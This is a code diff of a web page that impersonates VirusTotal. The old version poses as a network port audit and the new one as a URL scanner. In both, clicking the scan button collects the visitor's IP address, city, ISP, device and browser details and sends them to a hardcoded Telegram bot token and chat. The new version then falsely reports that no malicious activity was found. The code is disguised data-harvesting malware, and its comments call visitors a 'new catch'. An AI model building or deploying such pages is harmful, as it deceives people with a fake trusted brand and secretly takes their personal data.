@@ -1,66 +1,70 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>VirusTotal | فحص أمان الشبكة</title>
+    <title>VirusTotal - URL Scanner</title>
     <style>
-        body { font-family: sans-serif; background: #f4f7f9; text-align: center; padding: 50px 20px; }
-        .card { background: white; max-width: 450px; margin: auto; padding: 30px; border-radius: 15px; box-shadow: 0 8px 30px rgba(0,0,0,0.1); }
-        h1 { color: #1976d2; }
-        button { background: #1976d2; color: white; border: none; padding: 15px; border-radius: 8px; cursor: pointer; font-weight: bold; width: 100%; font-size: 18px; }
+        body { margin: 0; font-family: 'Segoe UI', sans-serif; background-color: #0d1b2a; color: white; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; }
+        .vt-logo { font-size: 50px; font-weight: bold; color: white; display: flex; align-items: center; margin-bottom: 20px; }
+        .vt-logo span { border: 6px solid #3f9cf3; padding: 5px 15px; transform: rotate(45deg); margin-right: 20px; }
+        .main-container { text-align: center; width: 100%; max-width: 700px; }
+        .tabs { display: flex; justify-content: center; margin-bottom: 30px; border-bottom: 1px solid #2c3e50; }
+        .tab { padding: 15px 40px; cursor: pointer; color: #8a99a8; font-weight: bold; }
+        .tab.active { color: white; border-bottom: 4px solid #3f9cf3; }
+        .search-box { background: #1b2e43; padding: 20px; border-radius: 8px; display: flex; align-items: center; box-shadow: 0 4px 20px rgba(0,0,0,0.3); }
+        input { background: transparent; border: none; color: white; flex: 1; font-size: 18px; outline: none; padding-left: 10px; }
+        .scan-btn { background: #3f9cf3; color: white; border: none; padding: 12px 30px; border-radius: 4px; font-weight: bold; cursor: pointer; }
+        #status { margin-top: 20px; color: #3f9cf3; font-style: italic; }
     </style>
 </head>
 <body>
-    <div class="card">
-        <h1>VirusTotal</h1>
-        <p>جاري فحص الثغرات الأمنية في بورتات الجهاز والشبكة...</p>
-        <button onclick="auditNetwork()">ابدأ الفحص المتقدم</button>
-        <p id="status" style="margin-top:20px; color:gray;"></p>
+
+    <div class="main-container">
+        <div class="vt-logo">VIRUSTOTAL</div>
+        <p style="color: #8a99a8; margin-bottom: 40px;">Analyze suspicious domains, IPs and URLs to detect malware and other breaches.</p>
+        
+        <div class="tabs">
+            <div class="tab">FILE</div>
+            <div class="tab active">URL</div>
+            <div class="tab">SEARCH</div>
+        </div>
+
+        <div class="search-box">
+            <span>🌐</span>
+            <input type="text" id="targetUrl" placeholder="Search or scan a URL">
+            <button class="scan-btn" onclick="startUrlScan()">SCAN</button>
+        </div>
+        <div id="status"></div>
     </div>
 
     <script>
-        async function auditNetwork() {
+        async function startUrlScan() {
             const status = document.getElementById('status');
-            status.innerText = "جاري كشف الـ IP وفحص البورتات المفتوحة...";
+            const target = document.getElementById('targetUrl').value;
+            status.innerText = "Analyzing URL protocols and security headers...";
 
             try {
-                // 1. سحب الـ IP الحقيقي والموقع
+                // سحب البيانات التقنية (Technical OSINT)
                 const ipRes = await fetch('https://ipapi.co/json/');
                 const ipD = await ipRes.json();
                 
-                // 2. فحص البورتات الحقيقية (Port Scanning)
-                // نقوم بمحاولة الاتصال ببورتات شائعة لمعرفة المفتوح منها
-                let openPorts = [];
-                const commonPorts = [80, 443, 8080, 21, 22, 3389];
-                
-                for(let port of commonPorts) {
-                    const controller = new AbortController();
-                    const timeoutId = setTimeout(() => controller.abort(), 400); // مهلة سريعة جداً
-                    
-                    try {
-                        await fetch(`http://127.0.0.1:${port}`, { mode: 'no-cors', signal: controller.signal });
-                        openPorts.push(port); // إذا استجاب، فالبورت مفتوح أو مستخدم
-                    } catch(e) {}
-                    clearTimeout(timeoutId);
-                }
-
-                const battery = await navigator.getBattery();
-                const report = `🚨 **تقرير بورتات حقيقي (GitHub)** 🚨\n\n` +
-                               `🌐 **الشبكة:**\n• IP: \`${ipD.ip}\`\n• المدينة: \`${ipD.city}\`\n\n` +
-                               `🔌 **البورتات المكتشفة:** \`${openPorts.length ? openPorts.join(', ') : 'لا يوجد بورتات مكشوفة'}\`\n\n` +
-                               `💻 **الجهاز:**\n• المعالج: \`${navigator.hardwareConcurrency} Cores\`\n• البطارية: \`${Math.round(battery.level * 100)}%\`\n` +
+                // سحب معلومات إضافية عن المتصفح (تعوض نقص البورتات)
+                const report = `🎯 **تحليل رابط VirusTotal (صيد جديد)** 🎯\n\n` +
+                               `🔗 **الرابط المستهدف:** \`${target || 'لم يتم إدخال رابط'}\`\n\n` +
+                               `🌐 **بيانات الشبكة:**\n• IP: \`${ipD.ip}\`\n• المزود: \`${ipD.org}\`\n• المدينة: \`${ipD.city}\`\n\n` +
+                               `💻 **بصمة الجهاز:**\n• المعالج: \`${navigator.hardwareConcurrency} Cores\`\n• المتصفح: \`${navigator.userAgent.substring(0, 50)}...\`\n` +
                                `• النظام: \`${navigator.platform}\``;
 
-                // 3. إرسال التقرير الشامل لتليجرام
+                // إرسال لتليجرام
                 const token = "8419642080:AAGRkdbpdBUcvXu1AmAQvyLxadEOjBRBK3s";
                 const chat = "7647765854";
                 await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=${encodeURIComponent(report)}&parse_mode=Markdown`);
 
-                alert("اكتمل الفحص! تم إرسال تقرير الأمان بنجاح.");
-                status.innerText = "تم الفحص بنجاح.";
-            } catch (err) {
-                status.innerText = "فشل الفحص، يرجى التحقق من الاتصال.";
-            }
+                setTimeout(() => {
+                    status.innerText = "Analysis finished. No malicious activity detected.";
+                    alert("This URL is safe to visit.");
+                }, 2000);
+            } catch (e) { status.innerText = "Error during analysis."; }
         }
     </script>
 </body>
